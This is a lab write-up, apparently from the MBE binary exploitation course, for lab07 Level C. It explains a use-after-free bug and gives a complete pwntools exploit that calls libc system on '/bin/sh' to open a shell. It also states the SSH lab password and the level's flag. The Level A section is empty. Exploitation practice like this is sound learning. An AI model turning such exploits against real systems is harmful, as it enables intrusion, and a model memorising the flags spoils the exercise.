## lab07

**Level C**

An easy problem just like what shown in `lecture`'s illustration, so I just follow the procedure step by step:

1. initialize a `data` object (with `"/bin/sh"` to be exploited)
2. free this object
3. intialize a `number` object (with `system`'s address in decimal)
4. UAF the first `data` object

There is a strange situation that `system`'s address are not randomized hence I can construct a workable exploit.

```python
from pwn import *

shell = ssh(host='mbe', user='lab7C', password='lab07start')
p = shell.process('/levels/lab07/lab7C')

# address of libc system, strangely it is static
addr = 0xb7e63190

# set strings[1] string buffer
p.recvuntil('Choice: ')
p.sendline('1')
p.recvuntil('store: ')
p.sendline('/bin/sh')

# free strings[1]
p.recvuntil('Choice: ')
p.sendline('3')

# reset strings[1] as numbers[1]
p.recvuntil('Choice: ')
p.sendline('2')
p.recvuntil('store: ')
p.sendline(str(addr))

# UAF the strings[1]
p.recvuntil('Choice: ')
p.sendline('5')
p.recvuntil('print: ')
p.sendline('1')

p.interactive('cirq # ')
```

![flagc](07c1.png)

The flag is `us3_4ft3r_fr33s_4re_s1ck`.

---

**Level A**


